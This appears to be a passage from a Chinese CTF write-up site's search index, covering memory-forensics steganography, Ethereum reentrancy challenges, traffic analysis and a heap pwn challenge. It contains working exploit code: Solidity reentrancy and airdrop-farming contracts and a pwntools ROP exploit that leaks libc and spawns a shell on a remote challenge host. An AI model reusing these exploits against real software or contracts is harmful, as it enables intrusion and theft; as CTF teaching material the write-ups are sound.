\u9009\u53d6WinXPSP2x86\u4f5c\u4e3a\u9884\u8bbe \u7136\u540e\u67e5\u770b\u8fdb\u7a0b\u4fe1\u606f volatility -f Advertising \\ for \\ Marriage.raw prefile = WinXPSP2x86 pslist \u53ef\u4ee5\u770b\u5230\uff0c\u5b58\u5728\u4e00\u4e2a\u8fdb\u7a0bnotepad.exe\uff0c\u67e5\u770b\u4e00\u4e0bnotepad.exe\u7684\u5185\u5bb9\u4fe1\u606f \u53ef\u4ee5\u770b\u5230\uff0c\u5b58\u5728\u4e00\u6761\u63d0\u793a\u4fe1\u606f:????needmoneyandgirlfirend\uff0c\u5e94\u8be5\u6709\u4ec0\u4e48\u7279\u6b8a\u7528\u9014\u3002 \u63a5\u4e0b\u6765\uff0c\u626b\u63cf\u5185\u5b58\u4e2d\u6240\u6709\u6587\u4ef6\u3002 volatility -f Advertising \\ for \\ Marriage.raw prefile = WinXPSP2x86 filescan \u5c06\u626b\u63cf\u7ed3\u679c\u5bfc\u51fa\u5230\u6587\u672c\u6587\u4ef6\u4e2d\uff0c\u641c\u7d22\u53d1\u73b0\u5b58\u5728\u4e00\u5f20png\u56fe\u7247\u3002 \u5c06png\u56fe\u7247\u5bfc\u51fa\u3002 volatility -f Advertising \\ for \\ Marriage.raw prefile = WinXPSP2x86 dumpfiles -Q 0x000000000249ae78 -D ./ \u5c1d\u8bd5\u6253\u5f00\u6587\u4ef6\uff0c\u62a5\u9519: IHDR:CRC \u62a5\u9519\u4f4d\u7f6e\u662fIHDR\u533a\u57df\uff0c\u731c\u6d4b\u53ef\u80fd\u662f\u56fe\u7247\u5c3a\u5bf8\u88ab\u4fee\u6539\u5bfc\u81f4\u3002 \u7528python\u811a\u672c\u8ba1\u7b97\u56fe\u7247\u5b9e\u9645\u957f\u5ea6\u548c\u5bbd\u5ea6\uff0c\u5e76\u751f\u6210\u4fee\u590d\u540e\u7684\u56fe\u7247 import os import binascii import struct img = open ( vegetable.png , rb ) . read () for w in range ( 1024 ): for h in range ( 1024 ): data = img [ 0xc : 0x10 ] + struct . pack ( i , w ) + struct . pack ( i , h ) + img [ 0x18 : 0x1d ] crc32 = binascii . crc32 ( data ) 0xffffffff if crc32 == struct . unpack ( i , img [ 0x1d : 0x21 ])[ 0 ] 0xffffffff : print w , h print hex ( w ), hex ( h ) open ( vegetable_new.png , wb ) . write ( img [: 0xc ] + data + img [ 0x1d :]) exit () \u6210\u529f\u4fee\u590d\u56fe\u7247\uff0c\u5f97\u5230\u4e00\u5f20\u6a21\u7cca\u6709flag\u5b57\u6837\u7684\u56fe\u7247 emmmm...\u7136\u540e\u5c31\u6709\u5f88\u591a\u4eba\u5728\u75af\u72c2\u5730\u731c\u6d4bflag\uff0c\u7136\u800c\u6700\u7ec8\u4e5f\u6ca1\u731c\u51fa\u6765\u3002 \u5b9e\u9645\u4e0a\u8fd9\u662f\u4e00\u4e2aLSB\u9690\u5199\u7684\u56fe\u7247\u3002 \u5229\u7528StegSolve\u67e5\u770b\u6587\u4ef6\u7684\u4f4e\u4f4d\uff0c\u53d1\u73b0\u732b\u817b \u8fd9\u91cc\u4f3c\u4e4e\u9690\u85cf\u7740\u4ec0\u4e48\u6570\u636e\uff0c\u800c700000009\u4f3c\u4e4e\u662f\u8fd9\u4e9b\u6570\u636e\u7684\u957f\u5ea6\u3002 \u56de\u60f3\u8d77\u521a\u521ahint\uff0c\u731c\u6d4b\u5e94\u8be5\u662fLSB\u9690\u5199\u7684\u5bc6\u94a5\uff0c\u9700\u8981\u8fdb\u884c\u7206\u7834\u3002 \u641c\u7d22\u8d44\u6599\uff0c\u53d1\u73b0\u8fd9\u662f\u7528 livz/cloacked-pixel \u8fdb\u884c\u52a0\u5bc6\u7684\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c31\u9b54\u6539\u4e00\u6ce2\u5de5\u5177\u3002 def filter ( source_str ): for i in range ( len ( source_str )): if ord ( source_str [ i ]) 126 or ord ( source_str [ i ]) 32 : return False return True # Extract data embedded into LSB of the input file def extract ( in_file , out_file , password ): # Process source image img = Image . open ( in_file ) ( width , height ) = img . size conv = img . convert ( RGBA ) . getdata () print [+] Image size: %d x %d pixels. % ( width , height ) # Extract LSBs v = [] for h in range ( height ): for w in range ( width ): ( r , g , b , a ) = conv . getpixel (( w , h )) v . append ( r 1 ) v . append ( g 1 ) v . append ( b 1 ) data_out = assemble ( v ) # Decrypt characters = string . ascii_letters + string . digits for i in characters : for j in characters : for k in characters : for l in characters : password = i + j + k + l + needmoneyandgirlfirend cipher = AESCipher ( password ) data_dec = cipher . decrypt ( data_out ) if len ( data_dec ) 0 and filter ( data_dec ): print password , data_dec # Write decrypted data \u6700\u540e\u5f97\u5230\u5bc6\u94a5\uff1ab1cxneedmoneyandgirlfirend \u89e3\u7801base64\u5f97\u5230\uff1a Virginia ciphertext:gnxtmwg7r1417psedbs62587h0 \u6839\u636e\u63d0\u793a\uff0c\u89e3\u5bc6\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff0c\u5bc6\u94a5\u4ecd\u7136\u662f\u521a\u521a\u90a3\u4e32\u5b57\u7b26\uff0c\u5f97\u5230\u7ed3\u679c\uff1a flagisd7f1417bfafbf62587e0 flag{d7f1417bfafbf62587e0}","title":"Redhat2019_Advertising_for_Marriage"},{"location":"misc/LSB/Redhat2019_Advertising_for_Marriage/#advertise-for-marriage","text":"someone want a girlfriend.....","title":"Advertise For Marriage"},{"location":"misc/LSB/Redhat2019_Advertising_for_Marriage/#_1","text":"LSB \u9690\u5199 \u5185\u5b58\u53d6\u8bc1 \u56fe\u7247\u4fee\u590d","title":"\u8003\u70b9"},{"location":"misc/LSB/Redhat2019_Advertising_for_Marriage/#_2","text":"\u9996\u5148\uff0c\u5148\u67e5\u770b\u955c\u50cf\u4fe1\u606f volatility -f Advertising \\ for \\ Marriage.raw imageinfo \u9009\u53d6WinXPSP2x86\u4f5c\u4e3a\u9884\u8bbe \u7136\u540e\u67e5\u770b\u8fdb\u7a0b\u4fe1\u606f volatility -f Advertising \\ for \\ Marriage.raw prefile = WinXPSP2x86 pslist \u53ef\u4ee5\u770b\u5230\uff0c\u5b58\u5728\u4e00\u4e2a\u8fdb\u7a0bnotepad.exe\uff0c\u67e5\u770b\u4e00\u4e0bnotepad.exe\u7684\u5185\u5bb9\u4fe1\u606f \u53ef\u4ee5\u770b\u5230\uff0c\u5b58\u5728\u4e00\u6761\u63d0\u793a\u4fe1\u606f:????needmoneyandgirlfirend\uff0c\u5e94\u8be5\u6709\u4ec0\u4e48\u7279\u6b8a\u7528\u9014\u3002 \u63a5\u4e0b\u6765\uff0c\u626b\u63cf\u5185\u5b58\u4e2d\u6240\u6709\u6587\u4ef6\u3002 volatility -f Advertising \\ for \\ Marriage.raw prefile = WinXPSP2x86 filescan \u5c06\u626b\u63cf\u7ed3\u679c\u5bfc\u51fa\u5230\u6587\u672c\u6587\u4ef6\u4e2d\uff0c\u641c\u7d22\u53d1\u73b0\u5b58\u5728\u4e00\u5f20png\u56fe\u7247\u3002 \u5c06png\u56fe\u7247\u5bfc\u51fa\u3002 volatility -f Advertising \\ for \\ Marriage.raw prefile = WinXPSP2x86 dumpfiles -Q 0x000000000249ae78 -D ./ \u5c1d\u8bd5\u6253\u5f00\u6587\u4ef6\uff0c\u62a5\u9519: IHDR:CRC \u62a5\u9519\u4f4d\u7f6e\u662fIHDR\u533a\u57df\uff0c\u731c\u6d4b\u53ef\u80fd\u662f\u56fe\u7247\u5c3a\u5bf8\u88ab\u4fee\u6539\u5bfc\u81f4\u3002 \u7528python\u811a\u672c\u8ba1\u7b97\u56fe\u7247\u5b9e\u9645\u957f\u5ea6\u548c\u5bbd\u5ea6\uff0c\u5e76\u751f\u6210\u4fee\u590d\u540e\u7684\u56fe\u7247 import os import binascii import struct img = open ( vegetable.png , rb ) . read () for w in range ( 1024 ): for h in range ( 1024 ): data = img [ 0xc : 0x10 ] + struct . pack ( i , w ) + struct . pack ( i , h ) + img [ 0x18 : 0x1d ] crc32 = binascii . crc32 ( data ) 0xffffffff if crc32 == struct . unpack ( i , img [ 0x1d : 0x21 ])[ 0 ] 0xffffffff : print w , h print hex ( w ), hex ( h ) open ( vegetable_new.png , wb ) . write ( img [: 0xc ] + data + img [ 0x1d :]) exit () \u6210\u529f\u4fee\u590d\u56fe\u7247\uff0c\u5f97\u5230\u4e00\u5f20\u6a21\u7cca\u6709flag\u5b57\u6837\u7684\u56fe\u7247 emmmm...\u7136\u540e\u5c31\u6709\u5f88\u591a\u4eba\u5728\u75af\u72c2\u5730\u731c\u6d4bflag\uff0c\u7136\u800c\u6700\u7ec8\u4e5f\u6ca1\u731c\u51fa\u6765\u3002 \u5b9e\u9645\u4e0a\u8fd9\u662f\u4e00\u4e2aLSB\u9690\u5199\u7684\u56fe\u7247\u3002 \u5229\u7528StegSolve\u67e5\u770b\u6587\u4ef6\u7684\u4f4e\u4f4d\uff0c\u53d1\u73b0\u732b\u817b \u8fd9\u91cc\u4f3c\u4e4e\u9690\u85cf\u7740\u4ec0\u4e48\u6570\u636e\uff0c\u800c700000009\u4f3c\u4e4e\u662f\u8fd9\u4e9b\u6570\u636e\u7684\u957f\u5ea6\u3002 \u56de\u60f3\u8d77\u521a\u521ahint\uff0c\u731c\u6d4b\u5e94\u8be5\u662fLSB\u9690\u5199\u7684\u5bc6\u94a5\uff0c\u9700\u8981\u8fdb\u884c\u7206\u7834\u3002 \u641c\u7d22\u8d44\u6599\uff0c\u53d1\u73b0\u8fd9\u662f\u7528 livz/cloacked-pixel \u8fdb\u884c\u52a0\u5bc6\u7684\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c31\u9b54\u6539\u4e00\u6ce2\u5de5\u5177\u3002 def filter ( source_str ): for i in range ( len ( source_str )): if ord ( source_str [ i ]) 126 or ord ( source_str [ i ]) 32 : return False return True # Extract data embedded into LSB of the input file def extract ( in_file , out_file , password ): # Process source image img = Image . open ( in_file ) ( width , height ) = img . size conv = img . convert ( RGBA ) . getdata () print [+] Image size: %d x %d pixels. % ( width , height ) # Extract LSBs v = [] for h in range ( height ): for w in range ( width ): ( r , g , b , a ) = conv . getpixel (( w , h )) v . append ( r 1 ) v . append ( g 1 ) v . append ( b 1 ) data_out = assemble ( v ) # Decrypt characters = string . ascii_letters + string . digits for i in characters : for j in characters : for k in characters : for l in characters : password = i + j + k + l + needmoneyandgirlfirend cipher = AESCipher ( password ) data_dec = cipher . decrypt ( data_out ) if len ( data_dec ) 0 and filter ( data_dec ): print password , data_dec # Write decrypted data \u6700\u540e\u5f97\u5230\u5bc6\u94a5\uff1ab1cxneedmoneyandgirlfirend \u89e3\u7801base64\u5f97\u5230\uff1a Virginia ciphertext:gnxtmwg7r1417psedbs62587h0 \u6839\u636e\u63d0\u793a\uff0c\u89e3\u5bc6\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff0c\u5bc6\u94a5\u4ecd\u7136\u662f\u521a\u521a\u90a3\u4e32\u5b57\u7b26\uff0c\u5f97\u5230\u7ed3\u679c\uff1a flagisd7f1417bfafbf62587e0 flag{d7f1417bfafbf62587e0}","title":"\u505a\u9898\u8fc7\u7a0b"},{"location":"misc/blockchain/Hackergame2019_JCBank/","text":"Hackergame2019 JCBank \u4ee5\u592a\u574a Kovan \u6d4b\u8bd5\u94fe \u5408\u7ea6\u5730\u5740\uff1a https://kovan.etherscan.io/address/0xE575c9abD35Fa94F1949f7d559056bB66FddEB51 \u9898\u76ee\uff1a https://github.com/f61d/challenges/tree/master/misc/blockchain/Hackergame2019_JCBank/attachment Analysis \u4e24\u4e2a flag : get_flag_1 get_flag_2 get_flag_1 \u8bfb\u53d6 storage \u53d8\u91cf secret \u7684\u503c\u5373\u53ef\uff0c\u5176\u4f4d\u4e8e slot 0 \u7684\u4f4d\u7f6e\uff0c\u5176\u503c\u4e3a 0x175bddc0da1bd47369c47861f48c8ac \uff0c\u8c03\u7528 get_flag_1 \u5373\u53ef var Web3 = require ( web3 ); if ( typeof web3 !== undefined ) { web3 = new Web3 ( web3 . currentProvider ); } else { web3 = new Web3 ( new Web3 . providers . HttpProvider ( https://kovan.infura.io/v3/b38f10b5036f4e6691fcc690461097d1 )); } var address = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51 ; web3 . eth . getStorageAt ( address , 0 , function ( x , y ){ console . info ( y )}); web3 . eth . getStorageAt ( address , 1 , function ( x , y ){ console . info ( y )}); web3 . eth . getStorageAt ( address , 2 , function ( x , y ){ console . info ( y )}); get_flag_2 \u5229\u7528 Reentrancy \u548c \u6574\u578b\u4e0b\u6ea2 contract hack { address instance_address = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51 ; JCBank target = JCBank ( instance_address ); uint public have_withdraw = 0 ; string public s ; constructor () public payable {} function attack () public { target . deposit . value ( 0.1 ether )(); } function attack1 ( uint128 guess ) public { s = target . get_flag_1 ( guess ); } function attack2 () public { if ( have_withdraw == 1 ){ target . get_flag_2 ( 155418233698 ); } } function attack3 () public { target . withdraw ( 0.1 ether ); } function () payable { if ( have_withdraw == 0 msg . sender == instance_address ){ have_withdraw = 1 ; target . withdraw ( 0.1 ether ); } } } attack \u5b58\u5165\u4e00\u70b9\u91d1\u989d\uff0c attack3 \u91cd\u5165\u653b\u51fb\u4e24\u6b21\uff0c attack2 \u8c03\u7528 get_flag_2 \u5373\u53ef","title":"Hackergame2019_JCBank"},{"location":"misc/blockchain/Hackergame2019_JCBank/#hackergame2019-jcbank","text":"\u4ee5\u592a\u574a Kovan \u6d4b\u8bd5\u94fe \u5408\u7ea6\u5730\u5740\uff1a https://kovan.etherscan.io/address/0xE575c9abD35Fa94F1949f7d559056bB66FddEB51 \u9898\u76ee\uff1a https://github.com/f61d/challenges/tree/master/misc/blockchain/Hackergame2019_JCBank/attachment","title":"Hackergame2019 JCBank"},{"location":"misc/blockchain/Hackergame2019_JCBank/#analysis","text":"\u4e24\u4e2a flag : get_flag_1 get_flag_2 get_flag_1 \u8bfb\u53d6 storage \u53d8\u91cf secret \u7684\u503c\u5373\u53ef\uff0c\u5176\u4f4d\u4e8e slot 0 \u7684\u4f4d\u7f6e\uff0c\u5176\u503c\u4e3a 0x175bddc0da1bd47369c47861f48c8ac \uff0c\u8c03\u7528 get_flag_1 \u5373\u53ef var Web3 = require ( web3 ); if ( typeof web3 !== undefined ) { web3 = new Web3 ( web3 . currentProvider ); } else { web3 = new Web3 ( new Web3 . providers . HttpProvider ( https://kovan.infura.io/v3/b38f10b5036f4e6691fcc690461097d1 )); } var address = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51 ; web3 . eth . getStorageAt ( address , 0 , function ( x , y ){ console . info ( y )}); web3 . eth . getStorageAt ( address , 1 , function ( x , y ){ console . info ( y )}); web3 . eth . getStorageAt ( address , 2 , function ( x , y ){ console . info ( y )}); get_flag_2 \u5229\u7528 Reentrancy \u548c \u6574\u578b\u4e0b\u6ea2 contract hack { address instance_address = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51 ; JCBank target = JCBank ( instance_address ); uint public have_withdraw = 0 ; string public s ; constructor () public payable {} function attack () public { target . deposit . value ( 0.1 ether )(); } function attack1 ( uint128 guess ) public { s = target . get_flag_1 ( guess ); } function attack2 () public { if ( have_withdraw == 1 ){ target . get_flag_2 ( 155418233698 ); } } function attack3 () public { target . withdraw ( 0.1 ether ); } function () payable { if ( have_withdraw == 0 msg . sender == instance_address ){ have_withdraw = 1 ; target . withdraw ( 0.1 ether ); } } } attack \u5b58\u5165\u4e00\u70b9\u91d1\u989d\uff0c attack3 \u91cd\u5165\u653b\u51fb\u4e24\u6b21\uff0c attack2 \u8c03\u7528 get_flag_2 \u5373\u53ef","title":"Analysis"},{"location":"misc/blockchain/RoarCTF2019_CoinFlip/","text":"RoarCTF2019 CoinFlip RoarCTF2019 \u7684 CoinFlip \u9898\u76ee \u9898\u76ee\uff1a\u89c1 attachment \u76ee\u5f55 Analysis Deposit() \u53ef\u4ee5\u589e\u52a0 balance[msg.sender] \uff0c\u4f46\u662f\u9700\u8981\u53d1\u9001 msg.value 500 ether \u624d\u80fd\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u73b0\u5b9e \u8585\u7f8a\u6bdb\u653b\u51fb : \u90e8\u7f72\u7b2c\u4e09\u65b9\u81ea\u5408\u7ea6\uff0c\u7136\u540e\u8c03\u7528 Ap() \u548c Transfer() \u5c06\u94b1\u8f6c\u5230\u56fa\u5b9a\u5730\u5740 \u56fa\u5b9a\u5730\u5740\u8c03\u7528 CaptureTheFlag \u5373\u53ef contract hack { address instance_address = 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 ; P_Bank target = P_Bank ( instance_address ); function hack1 ( string b64email ) public { target . CaptureTheFlag ( b64email ); } } contract father { function createsons () { for ( uint i = 0 ; i 101 ; i ++ ) { son ason = new son (); } } } contract son { constructor () public { P_Bank tmp = P_Bank ( 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 ); tmp . Ap (); tmp . Transfer ( 0x7ec9f720a8d59bc202490c690139f8c7cbad568d , 1 ether ); } }","title":"RoarCTF2019_CoinFlip"},{"location":"misc/blockchain/RoarCTF2019_CoinFlip/#roarctf2019-coinflip","text":"RoarCTF2019 \u7684 CoinFlip \u9898\u76ee \u9898\u76ee\uff1a\u89c1 attachment \u76ee\u5f55","title":"RoarCTF2019 CoinFlip"},{"location":"misc/blockchain/RoarCTF2019_CoinFlip/#analysis","text":"Deposit() \u53ef\u4ee5\u589e\u52a0 balance[msg.sender] \uff0c\u4f46\u662f\u9700\u8981\u53d1\u9001 msg.value 500 ether \u624d\u80fd\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u73b0\u5b9e \u8585\u7f8a\u6bdb\u653b\u51fb : \u90e8\u7f72\u7b2c\u4e09\u65b9\u81ea\u5408\u7ea6\uff0c\u7136\u540e\u8c03\u7528 Ap() \u548c Transfer() \u5c06\u94b1\u8f6c\u5230\u56fa\u5b9a\u5730\u5740 \u56fa\u5b9a\u5730\u5740\u8c03\u7528 CaptureTheFlag \u5373\u53ef contract hack { address instance_address = 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 ; P_Bank target = P_Bank ( instance_address ); function hack1 ( string b64email ) public { target . CaptureTheFlag ( b64email ); } } contract father { function createsons () { for ( uint i = 0 ; i 101 ; i ++ ) { son ason = new son (); } } } contract son { constructor () public { P_Bank tmp = P_Bank ( 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 ); tmp . Ap (); tmp . Transfer ( 0x7ec9f720a8d59bc202490c690139f8c7cbad568d , 1 ether ); } }","title":"Analysis"},{"location":"misc/forensic/Traffic_Analysis/","text":"360CTF \u6d41\u91cf\u5206\u6790\u9898WriteUp \u7b2c\u4e00\u6b65\u3001\u5206\u6790\u6d41\u91cf \u6211\u4eec\u7528WireShark\u6253\u5f00\u6d41\u91cf\u5305\uff0c\u7ed3\u5408\u9898\u76ee\u63cf\u8ff0\uff0c\u53d1\u73b0\u662f\u653b\u51fb\u8005\u8fdb\u884cSQL\u5e03\u5c14\u76f2\u6ce8\u7684\u4e00\u7cfb\u5217\u6d41\u91cf\u3002 \u6211\u4eec\u63d0\u53d6\u5176HTTP\u7684\u6570\u636e\u5305\uff0c\u53ef\u4ee5\u6e05\u6670\u5730\u770b\u5230\u653b\u51fb\u8005\u76f2\u6ce8\u8fc7\u7a0b\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230ctf.flag\u5e93\u4e2d\u5b58\u5728\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u662furl\u4e0epasswd\u3002 \u7136\u540e\u901a\u8fc7\u653b\u51fb\u8005\u76f2\u6ce8\u7684\u6d41\u91cf\uff0c\u518d\u6839\u636e\u56de\u663e\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u5f97\u5230URL\u5b57\u6bb5\u7684\u503c\u4e3a\uff1a t.cn/Ai8PhqSb passwd\u5b57\u6bb5\u503c\u4e3a\uff1a bkis \u6211\u4eec\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u9875\uff0c\u7136\u540e\u662f\u4e00\u4e2a\u4e0b\u8f7d\u94fe\u63a5\uff0c\u8f93\u5165\u5bc6\u7801\u540e\u5373\u53ef\u4e0b\u8f7d\u5230 flag.zip \u6211\u4eec\u6253\u5f00\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u770b\u5230\u6587\u4ef6\u91cc\u9762\u6709flag.txt\u548cReadme.txt\uff0c\u4f46\u662f\u6709\u5bc6\u7801\uff0c\u5e94\u8be5\u4e0d\u662f\u8ba9\u6211\u4eec\u7206\u7834\u3002\u6b63\u5e38\u6765\u8bf4\u53ea\u9700\u8981flag.txt\u5373\u53ef\uff0cReadme.txt\u663e\u5f97\u6709\u4e9b\u591a\u4f59\uff0c\u4e8e\u662f\u60f3\u5230zip\u660e\u6587\u653b\u51fb\u3002 \u91cd\u65b0\u56de\u5230\u653b\u51fb\u6d41\u91cf\u4e2d\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u5728\u6ce8\u5165\u4e4b\u540e\u8fd8\u6709\u591a\u4f59\u7684\u64cd\u4f5c\uff0c\u4e3b\u8981\u662f\u8bfb\u53d6\u6587\u4ef6\u5939\u548c\u8bfb\u53d6\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u5176\u4e2d\u6709\u4e00\u6b65\u8bfb\u53d6\u4e86Readme.7z\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5c06\u8fd4\u56de\u7684\u5b57\u8282\u6d41\u5bfc\u51fa\u5230Readme.7z\u6587\u4ef6\u4e2d\u3002 \u63a5\u7740\u53ef\u4ee5\u770b\u5230\u91cc\u9762\u6709\u4e00\u4e2aReadme.txt\uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u5bf9\u5176\u5229\u7528zip\u660e\u6587\u653b\u51fb\uff0c\u5f97\u5230\u5bc6\u7801**CtF36o!s0** \u7528\u6539\u5bc6\u7801\u89e3\u5f00flag.zip\u5373\u53ef\u5f97\u5230flag flag{1d0ea6a36f6aaf7fa5d4b007454227d6}","title":"Traffic_Analysis"},{"location":"misc/forensic/Traffic_Analysis/#360ctf-writeup","text":"\u7b2c\u4e00\u6b65\u3001\u5206\u6790\u6d41\u91cf \u6211\u4eec\u7528WireShark\u6253\u5f00\u6d41\u91cf\u5305\uff0c\u7ed3\u5408\u9898\u76ee\u63cf\u8ff0\uff0c\u53d1\u73b0\u662f\u653b\u51fb\u8005\u8fdb\u884cSQL\u5e03\u5c14\u76f2\u6ce8\u7684\u4e00\u7cfb\u5217\u6d41\u91cf\u3002 \u6211\u4eec\u63d0\u53d6\u5176HTTP\u7684\u6570\u636e\u5305\uff0c\u53ef\u4ee5\u6e05\u6670\u5730\u770b\u5230\u653b\u51fb\u8005\u76f2\u6ce8\u8fc7\u7a0b\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230ctf.flag\u5e93\u4e2d\u5b58\u5728\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u662furl\u4e0epasswd\u3002 \u7136\u540e\u901a\u8fc7\u653b\u51fb\u8005\u76f2\u6ce8\u7684\u6d41\u91cf\uff0c\u518d\u6839\u636e\u56de\u663e\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u5f97\u5230URL\u5b57\u6bb5\u7684\u503c\u4e3a\uff1a t.cn/Ai8PhqSb passwd\u5b57\u6bb5\u503c\u4e3a\uff1a bkis \u6211\u4eec\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u9875\uff0c\u7136\u540e\u662f\u4e00\u4e2a\u4e0b\u8f7d\u94fe\u63a5\uff0c\u8f93\u5165\u5bc6\u7801\u540e\u5373\u53ef\u4e0b\u8f7d\u5230 flag.zip \u6211\u4eec\u6253\u5f00\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u770b\u5230\u6587\u4ef6\u91cc\u9762\u6709flag.txt\u548cReadme.txt\uff0c\u4f46\u662f\u6709\u5bc6\u7801\uff0c\u5e94\u8be5\u4e0d\u662f\u8ba9\u6211\u4eec\u7206\u7834\u3002\u6b63\u5e38\u6765\u8bf4\u53ea\u9700\u8981flag.txt\u5373\u53ef\uff0cReadme.txt\u663e\u5f97\u6709\u4e9b\u591a\u4f59\uff0c\u4e8e\u662f\u60f3\u5230zip\u660e\u6587\u653b\u51fb\u3002 \u91cd\u65b0\u56de\u5230\u653b\u51fb\u6d41\u91cf\u4e2d\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u5728\u6ce8\u5165\u4e4b\u540e\u8fd8\u6709\u591a\u4f59\u7684\u64cd\u4f5c\uff0c\u4e3b\u8981\u662f\u8bfb\u53d6\u6587\u4ef6\u5939\u548c\u8bfb\u53d6\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u5176\u4e2d\u6709\u4e00\u6b65\u8bfb\u53d6\u4e86Readme.7z\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5c06\u8fd4\u56de\u7684\u5b57\u8282\u6d41\u5bfc\u51fa\u5230Readme.7z\u6587\u4ef6\u4e2d\u3002 \u63a5\u7740\u53ef\u4ee5\u770b\u5230\u91cc\u9762\u6709\u4e00\u4e2aReadme.txt\uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u5bf9\u5176\u5229\u7528zip\u660e\u6587\u653b\u51fb\uff0c\u5f97\u5230\u5bc6\u7801**CtF36o!s0** \u7528\u6539\u5bc6\u7801\u89e3\u5f00flag.zip\u5373\u53ef\u5f97\u5230flag flag{1d0ea6a36f6aaf7fa5d4b007454227d6}","title":"360CTF \u6d41\u91cf\u5206\u6790\u9898WriteUp"},{"location":"pwn/","text":"waiting","title":"home"},{"location":"pwn/#waiting","text":"","title":"waiting"},{"location":"pwn/Heap/4-ReeHY-main/","text":"4-ReeHY-main \u8fd9\u9053\u9898\u76ee\u6709\u4e24\u79cd\u505a\u6cd5\uff0c\u4e00\u4e2a\u662f\u6574\u6570\u6ea2\u51fa\uff0c\u4e00\u4e2a\u662funlink\uff0c\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecdunlink\u3002 \u4e00\u3001\u6574\u6570\u6ea2\u51fa \u7a0b\u5e8f\u4e3b\u8981\u5206\u4e3a\u4e09\u5757\u4e3b\u8981\u5185\u5bb9\uff0c\u5206\u522b\u662f\u521b\u5efa\u6587\u672c\uff0c\u5220\u9664\u6587\u672c\uff0c\u7f16\u8f91\u6587\u672c\u3002\u9996\u5148\u5206\u6790create\u90e8\u5206 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6709\u4e00\u5904\u660e\u663e\u7684\u6574\u6570\u6ea2\u51fa\uff0c\u5229\u7528\u8fd9\u4e00\u70b9\u6211\u4eec\u53ef\u4ee5\u6784\u9020ROP\u94fe\u6cc4\u9732libc\u57fa\u5740\u5e76\u6267\u884csystem\u51fd\u6570\u3002\u4e0b\u9762\u662fexp from pwn import * #p = process( ./4-ReeHY-main-100 ) p = remote ( 111.198.29.45 , 31226 ) elf = ELF ( ./4-ReeHY-main-100 ) libc = elf . libc pop_addr = 0x0000000000400DA3 puts_plt = elf . plt [ puts ] puts_got = elf . got [ puts ] main_addr = 0x0000000000400C8C start_addr = 0x0000000000400760 gadget_sym = 0x45216 print p . recvuntil ( $ ) p . sendline ( 1234 ) print p . recvuntil ( $ ) p . sendline ( 1 ) print p . recvuntil ( Input size \\n ) p . sendline ( -1 ) print p . recvuntil ( Input cun \\n ) p . sendline ( 1 ) payload = a * 0x88 + \\x00 * 8 + a * 8 + p64 ( pop_addr ) + p64 ( puts_got ) + p64 ( puts_plt ) + p64 ( start_addr ) print p . recvuntil ( Input content \\n ) p . sendline ( payload ) data = p . recv ( numb = 6 ) data = data . ljust ( 8 , \\x00 ) data = u64 ( data ) puts_addr = data print puts_addr: + hex ( data ) libc_addr = puts_addr - libc . symbols [ puts ] print libc_addr: + hex ( libc_addr ) sys_addr = libc_addr + libc . symbols [ system ] print sys_addr: + hex ( sys_addr ) bin_addr = libc_addr + libc . search ( /bin/sh ) . next () print bin_Addr: + hex ( bin_addr ) gadget_addr = libc_addr + gadget_sym print gadget_addr: + hex ( gadget_addr ) print p . recvuntil ( $ ) p . sendline ( 1234 ) print p . recvuntil ( $ ) p . sendline ( 1 ) print p . recvuntil ( Input size \\n ) p . sendline ( -1 ) print p . recvuntil ( Input cun \\n ) p . sendline ( 1 ) payload = a * 0x88 + \\x00 * 8 + a * 8 + p64 ( pop_addr ) + p64 ( bin_addr ) + p64 ( sys_addr ) + p64 ( start_addr ) #payload = a * 0x88 + \\x00 * 8 + a * 8 + p64(gadget_addr) print p . recvuntil ( Input content \\n ) p . sendline ( payload ) p . interactive () \u4e8c\u3001unlink \u5206\u6790\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u5728delete\u5220\u9664\u6587\u672c\u7684\u65f6\u5019\uff0c\u5728free\u6389\u5806\u5757\u4e4b\u540e\u5e76\u6ca1\u6709\u6e05\u9664\u6389\u5730\u5740\u6570\u7ec4\u91cc\u7684\u6307\u9488 